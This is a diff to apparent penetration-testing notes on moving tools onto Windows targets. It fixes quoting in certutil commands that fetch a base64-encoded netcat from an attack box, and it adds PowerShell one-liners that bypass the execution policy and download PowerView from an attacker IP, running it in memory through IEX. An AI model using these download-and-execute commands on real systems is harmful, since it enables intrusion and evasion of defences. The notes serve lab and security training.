@@ -193,13 +193,13 @@ certutil.exe -encode [inputfilename] [encoded output filename]
 * To verify that the nc.txt file contains text, we can run the following command to print the first 10 lines to the terminal:
 
 ```
-powershell -command “Get-Content nc.txt -Head 10”
+powershell -command "Get-Content nc.txt -Head 10"
 ```
 
 * Now we have to transfer the text file to the target and decode it back to an executable.
 
 ```
-certutil.exe -urlcache -split -f “http://[attack box ip]/nc.txt” nc.txt
+certutil.exe -urlcache -split -f "http://[attack box ip]/nc.txt" nc.txt
 ```
 
 * And the following command decodes the base64
@@ -248,6 +248,16 @@ Get-ExecutionPolicy
 
 ```
 Set-ExecutionPolicy Unrestricted
+```
+
+#### Loading Script into Memory with powershell
+
+* The script can be loaded into memory with powershell&#x20;
+
+```
+powershell.exe -nop -ep bypass (new-object system.net.webclient).downloadstring('http://10.10.15.49/PowerView.ps1') | IEX
+#or 
+(new-object system.net.webclient).downloadstring('http://10.10.15.49/PowerView.ps1') | IEX
 ```
 
 ### Powershell Downloads: Start-BitsTransfer
